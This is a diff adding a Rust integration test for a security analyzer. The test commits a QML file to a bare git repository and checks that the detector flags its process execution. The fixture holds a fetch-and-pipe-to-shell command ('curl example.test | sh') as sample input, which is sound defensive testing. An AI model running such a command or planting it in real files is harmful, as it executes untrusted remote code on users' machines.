@@ -499,3 +499,92 @@ fn oversize_repo_blobs_become_skipped_entries_instead_of_aborting() {
             .contains(&"oversize_file_skipped".to_owned())
     );
 }
+
+#[test]
+fn pinned_tree_analysis_reads_blob_contents_through_object_ids() {
+    // End-to-end: ingest a bare repo, then run detectors over raw blob reads
+    // exactly like the CLI's GitRepository content source does.
+    let guard_temp = tempfile::tempdir().unwrap();
+    let work = guard_temp.path().join("work");
+    let bare = guard_temp.path().join("repo.git");
+    fs::create_dir(&work).unwrap();
+    std::fs::write(
+        work.join("Main.qml"),
+        b"Process { command: [\"sh\", \"-c\", \"curl example.test | sh\"] }\n",
+    )
+    .unwrap();
+    let git = |args: &[&str], cwd: &Path| {
+        let output = std::process::Command::new("git")
+            .args(args)
+            .current_dir(cwd)
+            .env("GIT_CONFIG_GLOBAL", "/dev/null")
+            .env("GIT_CONFIG_SYSTEM", "/dev/null")
+            .env("GIT_AUTHOR_NAME", "t")
+            .env("GIT_AUTHOR_EMAIL", "t@example.test")
+            .env("GIT_COMMITTER_NAME", "t")
+            .env("GIT_COMMITTER_EMAIL", "t@example.test")
+            .output()
+            .unwrap();
+        assert!(output.status.success());
+    };
+    git(&["init", "--quiet"], &work);
+    git(&["add", "."], &work);
+    git(&["commit", "--quiet", "-m", "x"], &work);
+    let head = String::from_utf8(
+        std::process::Command::new("git")
+            .args(["rev-parse", "HEAD"])
+            .current_dir(&work)
+            .output()
+            .unwrap()
+            .stdout,
+    )
+    .unwrap()
+    .trim()
+    .to_owned();
+    git(
+        &[
+            "clone",
+            "--quiet",
+            "--bare",
+            work.to_str().unwrap(),
+            bare.to_str().unwrap(),
+        ],
+        guard_temp.path(),
+    );
+
+    let mut inventory =
+        ingest_pinned_tree(&bare, &head, Limits::default(), TimeBudget::default()).unwrap();
+
+    // The CLI's reader: bounded cat-file by object id, size-verified,
+    // digest-verified against the ingested sample.
+    let read_content = |entry: &omasafe_analyzer::PayloadEntry| -> Option<Vec<u8>> {
+        use sha2::Digest;
+        if entry.sampled_digest {
+            return None;
+        }
+        let oid = entry.object_id.as_deref()?;
+        let output = std::process::Command::new("git")
+            .args(["cat-file", "blob", oid])
+            .current_dir(&bare)
+            .env("GIT_CONFIG_GLOBAL", "/dev/null")
+            .output()
+            .ok()?;
+        if !output.status.success() || output.stdout.len() as u64 != entry.size {
+            return None;
+        }
+        let digest = sha2::Sha256::digest(&output.stdout);
+        let hex_digest: String = digest.iter().map(|b| format!("{b:02x}")).collect();
+        (hex_digest == entry.sha256_sampled.as_deref()?).then_some(output.stdout)
+    };
+
+    let artifacts =
+        omasafe_analyzer::analyze_inventory(&mut inventory, &read_content, &TimeBudget::default());
+    let findings = artifacts.rendered_findings();
+    assert_eq!(findings.len(), 1, "{findings:?}");
+    assert_eq!(findings[0].rule_id, "oma.qml.process-execution");
+    assert_eq!(
+        findings[0].confidence.as_deref(),
+        Some("ast-backed"),
+        "git-sourced analysis is parser-backed like any other"
+    );
+}
